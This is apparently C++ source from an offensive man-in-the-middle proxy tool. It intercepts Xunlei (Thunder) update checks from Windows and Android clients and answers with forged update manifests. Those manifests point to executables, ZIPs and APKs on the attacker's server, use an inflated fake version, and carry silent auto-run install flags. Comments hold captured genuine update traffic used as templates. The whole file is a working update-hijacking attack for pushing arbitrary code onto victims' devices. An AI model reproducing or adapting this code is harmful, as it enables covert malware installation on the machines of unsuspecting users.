
#include "ThunderUpdate.h"
#include "../cipher/CryptoUtils.h"
#include "../attack.h"
#include "sslPublic.h"
#include "../HttpUtils.h"
#include "PluginServer.h"
#include "../PreparePacket.h"

int gThunderFlag = 0;

string gUrl = "";

//upgrade.xl9.xunlei.com
int ThunderUpdate::isThunder(const char* url, const char* host, const char* hdr) {
	if (strstr(host, "upgrade.xl9.xunlei.com") && strstr(url, "/pc?"))
	{
		gUrl = url;
		gThunderFlag = 1;
		return TRUE;
	}
	else if (strstr(host, "upgrade.xl9.xunlei.com") && strstr(url, "/plugin?"))
	{
		gUrl = url;

		string key = "User-Agent";
		string useragent = HttpUtils::getValueFromKey(hdr, key);
		if (useragent != "" && useragent.find("Dalvik") != -1 && useragent.find("Android") != -1)
		{
			gThunderFlag = 3;
		}
		else {
			gThunderFlag = 2;
		}

		return TRUE;
	}

	return FALSE;
}






int ThunderUpdate::replyThunder(char* dstbuf, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {
	int ret = FALSE;

	char* lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	string ip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

	string version = "99.9.9.4360";	//10.1.14.436

	char* retformat = 0;
	if (gThunderFlag == 1)
	{
		retformat =
			"{\"data\":{\"id\":\"156\",\"title\":\"xunlei11\",\"pid\":1,"
			"\"cid\":\"100001,100002,100003,100004,100005,100006,100007,100008,100009,100010,100011,100012,100013,100014,100015,100017,100018,100019,100020,"
			"100021,100022,100023,100024,100025,100026,100027,100028,100029,100030,100032,100033,100034,100035,100036,100037,100038,100044,100045,100050,100051,"
			"100052,100054,100057,100058,100059,100061,100063,100064,100065,100066,100067,100068,100069,100070,100071,100072,100073,100084,100086,100089,100090,"
			"100076,100091,100092,100093,100094,100095,100096,100098,100097,100099,100100,100101,100102,100103,100106,100107,100108,100109,100110\","
			"\"peerid\": \"\","
			"\"cover_version\":\"10.0.1-10.0.3,10.1.1-10.1.18,10.1.21-10.1.37,10.1.38.880,10.1.38.882,10.1.38.884,10.1.38.888,10.1.38.890,11.0.0-11.4.0,"
			"11.4.2-11.4.5,11.4.5-99.4.5,11.4.6.2080,11.4.6.2082\","
			"\"cover_os_version\":\"6.0-11.0\",\"v\":\"%s\",\"t\":2,"
			"\"desc\":\"update\","
			"\"status\":\"1\",\"url\":\"https://%s/%s\","
			"\"size\":%u,\"param\":\"/S /LiveUpdate /AutoRun\",\"md5\":\"%s\","
			"\"lng\":\"0804\",\"retrywait\":0,\"retrytimes\":0,\"name\":\"迅雷9正式版\"},\"content\":\"success\",\"code\":0}";

		string filename = Public::getUserPluginPath(lphttp->username) + WEIXIN_PC_UPDATE_EXE_FILENAME;
		char szmd5[256] = { 0 };
		unsigned char hexmd5[256] = { 0 };
		int exefs = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);

		char result[4096] = { 0 };
		int retlen = sprintf(result, retformat, version.c_str(), ip.c_str(), WEIXIN_PC_UPDATE_EXE_FILENAME, exefs, szmd5);

		int responseLen = sprintf_s(dstbuf, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);

		return responseLen;

	}
	else if (gThunderFlag == 2)
	{
		string strver = "";
		int pos = gUrl.find("v=");
		if (pos > 0)
		{
			pos += 2;
			int nextpos = gUrl.find("&", pos);
			if (nextpos - pos > 0)
			{
				strver = gUrl.substr(pos, nextpos - pos);
			}
		}

		PreparePacket* prepare = new PreparePacket();
		string strtag = prepare->prepareThunder(strver);

		retformat = "{\"data\":["
			"{\"name\":\"DownloadSDKUpdate\",\"version\":\"9.79.110.0\",\"time\":1,\"status\":1,\"loadtype\":1,\"vipstate\":0,\"state\":0,"
			"\"url\":\"http://%s/%s\","
			"\"md5\":\"%s\",\"description\":\"ipv6\",\"versionDetail\":\"10.1.9-99.1.14\","
			"\"versionOsDetail\":\"\",\"cid\":\"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,100022,"
			"100023,100024,100025,100026,100027,100028,100029,100030,100032,100033,100034,100035\",\"id\":312,\"pid\":21}"
			// 			","
			// 			"{\"name\":\"XLLiveUDFix\",\"version\":\"9.1\",\"time\":1,\"status\":1,\"loadtype\":1,\"vipstate\":0,\"state\":0,"
			// 			"\"url\":\"http://%s/%s\","
			// 			"\"md5\":\"%s\",\"description\":\"\",\"versionDetail\":\"10.1.8-99.1.15\",\"versionOsDetail\":\"\","
			// 			"\"cid\":\"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,100022,100023,100024,100025,100026,"
			// 			"100027,100028,100029,100030,100032,100033,100034,100035\",\"id\":314,\"pid\":21}"
			"],\"content\":\"\",\"tag\":\"%s\",\"code\":0}";

		string fn1 = "xunlei1.zip";
		string filename1 = Public::getUserPluginPath(lphttp->username) + fn1;
		char szmd5_1[256] = { 0 };
		unsigned char hexmd5[256] = { 0 };
		int fs1 = CryptoUtils::getUpdateFileMd5(filename1, szmd5_1, hexmd5, FALSE);

		// 		string fn2 = "xunlei2.zip";
		// 		string filename2 = Public::getUserPluginPath(lphttp->username) + fn2;
		// 		char szmd5_2[256] = { 0 };
		// 		int fs2 = CryptoUtils::getUpdateFileMd5(filename2, szmd5_2, hexmd5, FALSE);

		char result[4096] = { 0 };
		int retlen = sprintf(result, retformat, ip.c_str(), fn1.c_str(), szmd5_1, strtag.c_str());
		//int retlen = sprintf(result, retformat, ip.c_str(), fn1.c_str(),szmd5_1,ip.c_str(),fn2.c_str(), szmd5_2,strtag.c_str());

		int responseLen = sprintf_s(dstbuf, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);

		return responseLen;
	}
	else if (gThunderFlag == 3)
	{
		string strver = "";
		int pos = gUrl.find("v=");
		if (pos > 0)
		{
			pos += 2;
			int nextpos = gUrl.find("&", pos);
			if (nextpos - pos > 0)
			{
				strver = gUrl.substr(pos, nextpos - pos);
			}
		}

		PreparePacket* prepare = new PreparePacket();
		string strtag = prepare->prepareThunder(strver);

		retformat = "{\"data\":["
			// 			"{\"name\":\"com.xunlei.plugin.libdlna\",\"version\":\"9\",\"time\":0,\"status\":1,\"loadtype\":1,"
			// 			"\"vipstate\":0,\"state\":0,\"url\":\"http://%s/%s\",\"md5\":\"%s\",\"description\":\"\",\"versionDetail\":\"0-29999\","
			// 			"\"versionOsDetail\":\"\",\"cid\":\"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,100022,100023,100024,100025,100026,100027,100028\","
			// 			"\"id\":118,\"pid\":7},"

			"{\"name\":\"com.xunlei.plugin.qrcode\",\"version\":\"79\",\"time\":0,\"status\":1,\"loadtype\":1,\"vipstate\":0,\"state\":0,"
			"\"url\":\"http://%s/%s\",\"md5\":\"%s\",\"description\":\"\",\"versionDetail\":\"10975-29999\","
			"\"versionOsDetail\":\"\",\"cid\":\"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,100022,100023,100024,100025,100026,100027,100028\","
			"\"id\":123,\"pid\":7},"

			"{\"name\":\"com.xunlei.video\",\"version\":\"19999\",\"time\":0,\"status\":1,\"loadtype\":1,\"vipstate\":0,\"state\":0,"
			"\"url\":\"http://%s/%s\",\"md5\":\"%s\",\"description\":\"\",\"versionDetail\":\"11525-29999\",\"versionOsDetail\":\"\","
			"\"cid\":\"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,100022,100023,100024,100025,100026,100027,100028\","
			"\"id\":243,\"pid\":7}],\"content\":\"\",\"tag\":\"%s\",\"code\":0}";
		//861ce7fea214d30536da50cc6ba6ba6e

		string fn1 = "xunlei-qrcode.apk";
		string filename1 = Public::getUserPluginPath(lphttp->username) + fn1;
		char szmd5_1[256] = { 0 };
		unsigned char hexmd5[256] = { 0 };
		int fs1 = CryptoUtils::getUpdateFileMd5(filename1, szmd5_1, hexmd5, FALSE);

		string fn2 = "xunlei-video.apk";
		string filename2 = Public::getUserPluginPath(lphttp->username) + fn2;
		char szmd5_2[256] = { 0 };
		int fs2 = CryptoUtils::getUpdateFileMd5(filename2, szmd5_2, hexmd5, FALSE);

		char result[4096] = { 0 };
		int retlen = sprintf(result, retformat, ip.c_str(), fn1.c_str(), szmd5_1, ip.c_str(), fn2.c_str(), szmd5_2, strtag.c_str());

		int responseLen = sprintf_s(dstbuf, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);

		return responseLen;
	}

	return 0;
}


/*
upgrade.xl9.xunlei.com/plugin?peerid=3FEC19B000009KPQ&os=10.0.0.0.1&pid=21&v=10.1.12.400&cid=100022&lng=0804&tag=
GET /plugin?peerid=3FEC19B000009KPQ&os=10.0.0.0.1&pid=21&v=10.1.12.400&cid=100022&lng=0804&tag= HTTP/1.1
Accept: application/json, text/plain, *//*
Content-Type: application/x-www-form-urlencoded
User-Agent: axios/0.18.0
Host: upgrade.xl9.xunlei.com
Connection: close

HTTP/1.1 200 OK
Date: Sat, 15 Jun 2019 11:24:34 GMT
Content-Type: application/json
Content-Length: 4059
Connection: close
Expires: Sat, 15 Jun 2019 11:39:34 GMT
Cache-Control: max-age=900

{"data":[{"name":"Centertip","version":"1.5","time":1,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201811/c4082abd1bd900eda878e97c3ba60352.zip",
"md5":"586798746081bd0daab1c9bd316c696f","description":"......XDAS......Tip.....................",
"versionDetail":"10.1.5-10.1.30","versionOsDetail":"",
"cid":"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,100022,100023,100024,100025,100026,100027,
100028,100029,100030,100032,100033,100034,100035","id":248,"pid":21},
{"name":"VipReportCoinTask","version":"1.0","time":5,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201811/8d66375d4c545e8a5de775cf6fc72fac.zip",
"md5":"fbf8ea8c6c2835403d1edf2e585978f9","description":"......X...xds.....................",
"versionDetail":"10.1.0-10.1.30","versionOsDetail":"",
"cid":"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,100022,100023,
100024,100025,100026,100027,100028,100029,100030,100032,100033,100034,100035","id":251,"pid":21},
{"name":"ThunderXWebUpdate","version":"1.6","time":1,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201905/6aa48b52c6cf349f79567908780ac889.zip",
"md5":"2c6d54ed5f142676b13b186ce3b57837","description":"......","versionDetail":"10.1.12",
"versionOsDetail":"","cid":"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,
100022,100023,100024,100025,100026,100027,100028,100029,100030,100032,100033,100034","id":259,"pid":21},
{"name":"XmpPauseAd","version":"1.1","time":1,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201905/98fb9ff56312f10d66a4c99e0cca8335.zip",
"md5":"52f2a32cbe43efeb6401a463dd46c739","description":"","versionDetail":"10.1.12-10.1.15",
"versionOsDetail":"","cid":"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,
100022,100023,100024,100025,100026,100027,100028,100029,100030,100032,100033,100034","id":297,"pid":21},
{"name":"hotfix-10.1.12","version":"1.3","time":1,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201905/d847fb5dc395c04cf588bf7958330bd6.zip",
"md5":"5ba5337abce2fca4867fae34dab163a9","description":"","versionDetail":"10.1.12.400",
"versionOsDetail":"","cid":"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,
100022,100023,100024,100025,100026,100027,100028,100029,100030,100032,100033,100034","id":301,"pid":21},
{"name":"ToolbarVipButton","version":"1.0","time":1,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201905/c46d1d47f96fa504dd8c7c8004b82e5b.zip",
"md5":"aad22d3e1b1286b89b54fc42d2db67d1","description":"","versionDetail":"10.1.11-10.1.12",
"versionOsDetail":"","cid":"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,
100022,100023,100024,100025,100026,100027,100028,100029,100030,100032,100033,100034","id":302,"pid":21},
{"name":"DownloadSDKUpdate","version":"2.79.110.0","time":1,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201906/551a20556ec58aac1c094d2fc9c0debb.zip",
"md5":"009f0da92ab42f5030c9dce180e31c9f","description":"ipv6............","versionDetail":"10.1.9-10.1.14",
"versionOsDetail":"","cid":"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,100022,
100023,100024,100025,100026,100027,100028,100029,100030,100032,100033,100034,100035","id":312,"pid":21},
{"name":"XLLiveUDFix","version":"1.1","time":1,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201906/f18200a2c2d72d4e05f1e53f3a71f2e1.zip",
"md5":"ee88e713d8089a2b9abd97e7de99d584","description":"","versionDetail":"10.1.8-10.1.15","versionOsDetail":"",
"cid":"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,100022,100023,100024,100025,100026,
100027,100028,100029,100030,100032,100033,100034,100035","id":314,"pid":21}],"content":"",
"tag":"a9204648562a39de267dd47e07999947","code":0}
*/


/*
GET /pc?peerid=3FEC19B000009KPQ&os=10.0.0.0.1&pid=1&v=10.1.12.400&cid=100022&t=2&lng=0804 HTTP/1.1
Accept: application/json, text/plain, *//*
Content-Type: application/x-www-form-urlencoded
User-Agent: axios/0.18.0
Host: upgrade.xl9.xunlei.com
Connection: close

HTTP/1.1 200 OK
Date: Mon, 27 May 2019 01:31:28 GMT
Content-Type: application/json
Content-Length: 891
Connection: close
Expires: Mon, 27 May 2019 01:46:28 GMT
Cache-Control: max-age=900

{"data":{"id":"31","title":"手动升级到迅雷X最新版","pid":1,
"cid":"100001,100002,100003,100004,100005,100006,100007,100008,100009,100010,100011,100012,100013,100014,100015,100017,100018,100019,100020,100021,100022,100023,100024,100025,100026,100027,100028,100029,100030",
"cover_version":"9.0.1-9.0.20,9.1.21-9.1.49,9.5.60-9.5.63,10.0.1-10.0.3,10.1.0-10.1.12",
"cover_os_version":"6.0-10.0","v":"10.1.14.436","t":2,
"desc":"增强过滤BT任务中广告文件的能力\n优化取消下载任务的用户体验\n设置中心新增“下载代理”设置项\n设置中心新增“编辑不接管下载网站”设置项",
"status":"1","url":"http://pc.down.sandai.net/thunderx/XunLeiSetup10.1.14.436.exe",
"size":0,"param":"/S /LiveUpdate /AutoRun","md5":"6AA4ED730CF8D4FE595D08B16CBC8EA2",
"lng":"0804","retrywait":0,"retrytimes":0,"name":"迅雷9正式版"},"content":"success","code":0}
*/


//upgrade.xl9.xunlei.com/plugin?os=10.0.0.0.1&pid=7&cid=100001&lng=0804&peerid=3082d2b8823b6c059d117d3db5740f83&v=11560&rd=1564444800

/*
GET /plugin?os=10.0.0.0.1&pid=7&cid=100001&lng=0804&peerid=3082d2b8823b6c059d117d3db5740f83&v=11560&rd=1564444800 HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; ALP-AL00 Build/HUAWEIALP-AL00)
Host: upgrade.xl9.xunlei.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Date: Tue, 30 Jul 2019 09:09:48 GMT
Content-Type: application/json
Content-Length: 4529
Connection: keep-alive
Expires: Tue, 30 Jul 2019 09:24:48 GMT
Cache-Control: max-age=900

{"data":[{"name":"com.xunlei.plugin.libdlna","version":"9","time":0,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201907/cd005fafd8f96da4326d7349b24305a1.apk","md5":"6df2d3f13551003eafb7e46fee94a918",
"description":"","versionDetail":"0-29999","versionOsDetail":"",
"cid":"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,100022,100023,100024,100025,100026,100027,100028",
"id":118,"pid":7},{"name":"com.xunlei.plugin.videorecorder","version":"5","time":0,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201711/fc0c2d817fcfad208a9759a82bddf5d0.apk","md5":"a97665dae7eccc71ccaffa2252484bb1",
"description":"","versionDetail":"10975-11019,11021-19999","versionOsDetail":"",
"cid":",100001,100002,100003,100004,100005,100006,100007,100008,100009,100010,100011,100012,100013,100014,100015,100017,100018",
"id":121,"pid":7},{"name":"com.xunlei.tdlive.plugin.app","version":"421","time":0,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201907/9ee2ce14a32818bed35d3ab2ce401877.apk","md5":"9f89853529be0c87993b03c75ac95a2e",
"description":"","versionDetail":"10912-29999","versionOsDetail":"",
"cid":"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,100022,100023","id":122,"pid":7},
{"name":"com.xunlei.plugin.qrcode","version":"21","time":0,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201907/10b31daa7ef2a8197aa70d55e41bcf50.apk","md5":"26f549641afdde834253d2e93300d739",
"description":"","versionDetail":"10975-29999","versionOsDetail":"",
"cid":"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,100022,100023,100024,100025,100026,100027,100028",
"id":123,"pid":7},{"name":"com.xunlei.plugin.transcode","version":"9","time":0,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201810/4c650b89d481c6a5597368bdc8edcda9.zip","md5":"8411cb3a6bab2098dd13c244f5ebd1bc",
"description":"","versionDetail":"10991-29999","versionOsDetail":"",
"cid":"100001,100002,100003,100004,100005,100017,100018,100019,100025,100020,100021,100022,100023,100024,100026,100027,100028",
"id":130,"pid":7},{"name":"com.xunlei.plugin.videoplayer","version":"5","time":0,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201809/8dc7aad2d1996b82921592b0fbd7b9e9.apk","md5":"e4147a93930c1d20c070afe63845ce63",
"description":"","versionDetail":"10975-11009,11011-29999","versionOsDetail":"",
"cid":"100001,100002,100003,100004,100005,100017,100018,100019,100025,100020,100021,100022,100023,100024,100026,100027,100028",
"id":136,"pid":7},{"name":"com.xunlei.downloadlib","version":"2","time":0,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201809/a51eb2df29c427a7518675ebe9c2fb28.zip","md5":"0e1796aba2b28759e56deaa7b94592bd",
"description":"","versionDetail":"0-29999","versionOsDetail":"",
"cid":"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,100022,100023","id":147,"pid":7},
{"name":"com.xunlei.plugin.acc","version":"2","time":0,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201809/e338b0ec739c3b60dc8fdf30859644ed.apk","md5":"7d6f82c643ec48af4847514fd705fc9f",
"description":"","versionDetail":"0-29999","versionOsDetail":"",
"cid":"100001,100002,100003,100004,100005,100017,100018,100019,100025,100020,100021,100022,100023,100024,100026,100027,100028",
"id":161,"pid":7},{"name":"com.xunlei.plugin.speeddetector","version":"22","time":0,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201907/43ce79478c556e51e770453ecaf100e5.apk","md5":"88156169eb0070ed589bb66c5cbfa198",
"description":"","versionDetail":"11135-29999","versionOsDetail":"",
"cid":"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,100022,100023","id":235,"pid":7},
{"name":"com.xunlei.video","version":"10307","time":0,"status":1,"loadtype":1,"vipstate":0,"state":0,
"url":"http://static-xl9-ssl.xunlei.com/plugins/201907/d31f43c6b02231963ca71d7fec71bb22.apk","md5":"5483bfd52eb912fea8e605aede398914",
"description":"鐑墽","versionDetail":"11525-29999","versionOsDetail":"",
"cid":"100001,100002,100003,100004,100005,100017,100018,100019,100020,100021,100022,100023,100024,100025,100026,100027,100028",
"id":243,"pid":7}],"content":"","tag":"861ce7fea214d30536da50cc6ba6ba6e","code":0}
*/